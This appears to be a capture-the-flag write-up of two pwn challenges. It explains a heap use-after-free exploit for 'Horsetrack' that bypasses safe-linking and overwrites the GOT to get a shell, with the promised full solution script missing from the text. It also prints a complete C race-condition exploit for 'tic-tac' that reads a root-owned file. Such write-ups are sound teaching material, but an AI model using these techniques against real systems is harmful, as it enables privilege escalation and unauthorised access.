## Horsetrack (pwn)

### Security mitigations:
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'./'
```

### Reversing
There is an array of 18 inline objects (I call the objects `horse_t`), which is initialized with the following:

```
void init_horses(horse_t *chunk)
{
  int i;
  
  for (i = 0; i < 18; i = i + 1) {
    chunk[i].name = (char *)0x0;
    chunk[i].distance = i;
    chunk[i].occupied = 0;
  }
  return;
}
```

The actual array is on the heap:
```
horses = (horse_t *)malloc(288);
```

I also managed to infer the fields of `horse_t`:
```
typedef struct {
  char* name;
  int distance;
  int occupied;
} horse_t;
```

Each horse is 16 bytes. The `occupied` field is `0` if the horse stall is occupied, and `1` otherwise. The program allows you to add/remove horses, and race them (which randomly increments the `distance` field of currently occupied horses and stops when some threshold distance is achieved by a horse).

There is also a hidden option (which I call `head_start`), which allows you to modify the first 16 bytes of a horse's name, and also change its distance arbitrarily.

### Vulnerabilities
There's an obvious use-after-free in the `head_start` function, since you can modify the contents of a horse's `name` field even after the corresponding chunk has been freed. Specifically, it happens here:

```
void head_start(horse_t *horses)
{
  ... [omitted for brevity]
  
  printf("Stable index # (0-%d)? ",0x11);
  __isoc99_scanf(&g_int_fmt,&idx);
  if (((int)idx < 0) || (17 < (int)idx)) {
    puts("Invalid stable index");
  }
  else {
    name_horse(horses[(int)idx].name,16);
    printf("New spot? ");
    __isoc99_scanf(&g_int_fmt,&dist_new);
    horses[(int)idx].distance = dist_new;
    printf("Modified horse in stable index %d\n",(ulong)idx);
  }
  if (cookie != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

If we can get a chunk into the tcache and modify its next pointer, we could potentially get an arbitrary write (since PIE is off, we know where functions and data in the binary are).

At this point, I tried writing a proof of concept for the arbitrary write primitive, but kept running into an error: `malloc(): unaligned tcache chunk detected`. It turns out that `glibc 2.33`, the one used in the challenge, has something called safe-linking which prevents this kind of attack. Safe-linking mangles the next pointer of tcache and fastbin chunks to make it harder to get an arbitrary write.

Specifically, upon allocating a chunk from the tcache (or fastbin), `malloc` demangles the next pointer as follows:

```
#define PROTECT_PTR(pos, ptr, type) ((type)((((size_t)pos) >> PAGE_SHIFT) ^ ((size_t)ptr)))
#define REVEAL_PTR(pos, ptr, type) PROTECT_PTR(pos, ptr, type)
```

Basically, when a chunk is freed, `free` "encrypts" the chunk's next pointer by xor'ing it with its address right shifted by 12 bits (this is to ensure that randomized ASLR bits are used as the XOR mask). Thus, when `malloc` is called, the next pointer is decrypted by performing the same operation in reverse. The issue I had earlier was that the de-mangled pointer was not aligned to 16 bytes.

To bypass this mitigation, we need a heap leak. Luckily, there's another vulnerability in the `name_horse` function that allows us to leak a heap pointer. The `name_horse` function gets a string from the user and writes it to a heap chunk (representing a horse's name).

```
void name_horse(char *name,uint name_length)
{
  int curr_ch;
  char *curr;
  char tmp;
  int len;
  
  printf("Enter a string of %d characters: ",(ulong)name_length);
  len = 0;
  curr = name;
  while( true ) {
    if ((int)name_length <= len) {
      do {
        curr_ch = getchar();
      } while ((char)curr_ch != '\n');
      *curr = '\0';
      return;
    }
    curr_ch = getchar();
    tmp = (char)curr_ch;
    while (tmp == '\n') {
      curr_ch = getchar();
      tmp = (char)curr_ch;
    }
    if (tmp == '\xff') break;
    *curr = tmp;
    len = len + 1;
    curr = curr + 1;
  }
  return;
}
```

Notice the line `if (tmp == '\xff') break;`. If the user types in the byte `0xff`, then the loop will exit and the name will not be written any further. If we `free` then `malloc` a horse's name and pass the chunk to this function (and input `0xff`), then we can achieve a horse that is both occupied and has a heap pointer (the next pointer written by `free`) in its name.

When horses are raced together, the names of the horses are printed out:
```
while (num_horses = winner_exists(horses), num_horses == 0) {
  update_horses(horses);
  print_horses(horses);
}
```

Therefore, we have a heap info leak.

### Exploit
The exploit plan is as follows:

1) Leak a heap address.

    1) `malloc` and `free` a chunk that represents a horse's name (by using `add_horse` and `remove_horse`). 

    2) `malloc` another chunk for a horse's name, naming it `0xff` (by using `add_horse`).


2) Overwrite `free`'s GOT entry with `system`'s PLT entry.

    1) Use the `head_start` function to write a mangled pointer (`free@GOT`) to the next field of a tcache chunk. The heap leak from earlier will be used here.
    
    2) Call `malloc` twice to get `free@GOT` (by using `add_horse`).
    
    3) Name this horse `system@PLT`.


3) Call `free`.

    1) Use `add_horse` to create a horse named `/bin/sh`.

    2) Free it with `remove_horse`.

Note that `remove_horse` eventually does `free(horses[(int)idx].name)`, so if the name is the string `/bin/sh`, then this effectively becomes `system("/bin/sh")`.

Here is the full solution:
```

## tic-tac (pwn)

We're given access to a server which contains a binary owned by root. The source is also given:

```
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}
```

The goal is to read a file called `flag.txt`, also owned by root. If we execute the program with `./txtreader ./flag.txt`, the program will crash because we don't own the file.

At first glance, this seems pretty secure, but what if we can modify the file in between it being loaded into memory and it being checked?

I tried putting a `getchar` in between the `ifstream` constructor and the call to `stat`, recompiled it, and ran the binary locally with `./txtreader ./junk` (where `junk` is a symlink to `./flag.txt`, which is owned by root):

```
std::string filename = argv[1];
std::ifstream file(filename);
struct stat statbuf;

getchar();

// Check the file's status information.
if (stat(filename.c_str(), &statbuf) == -1) {
```

While `getchar` stalled, I removed `junk` and replaced it with a normal, empty file with the same name (owned by me). Then, upon continuing execution, the program read out the contents of `flag.txt`!. It turns out that `filename.c_str()` returns the string `"junk"` instead of `flag.txt`, since we swapped the symlink out for a normal file. This means the permission check will pass, and it will output the contents of the original file.

The challenge is timing the attack properly. There are two basic techniques I used:

1) Call `nice` to lower the process' priority

2) Make a filesystem maze to lengthen the amount of time between the file open and permissions check

The filesystem maze is just a bunch of nested directories with symlinks. For example, it might look like: `./a/b/c/.../z/symlink_to_maze/a/b/.../z/`.

I also had to time the gap to get things working properly, which ended up being around `4600 ms` before the permission check. Of course, in between the gap, we have to 1) remove the `junk` symlink, and 2) create a new empty file called `junk`. We can do this in a separate process. Here's the final program (`solve.c`):

```
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/wait.h>

int main() {
    char* filename = "./maze/a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/k_end/root/l_end/root/m_end/root/n_end/root/o_end/root/p_end/root/q_end/root/r_end/root/junk";
    char* filename_short = "./maze/junk";
    char* flag = "./flag.txt";

    unlink(filename);
    symlink(flag, filename);

    int pid = fork();
    if (pid == 0) {
        // low scheduler priority
        nice(19);

        // in child process, start the challenge
        char* argv[] = { "./txtreader", filename, NULL };
        execve(argv[0], argv, NULL);
    } else {
        usleep(4600);
        unlink(filename_short);

        // make file with same name, but not symlink: this is because
        // filename.c_str() will return the actual filename, not "flag.txt"
        // and the perms check will pass
        close(open(filename_short, O_WRONLY|O_CREAT));

        waitpid(pid, 0, 0);
        unlink(filename_short);
    }
}
```

Running this consecutively with `while : do ./solve done` reveals the flag.
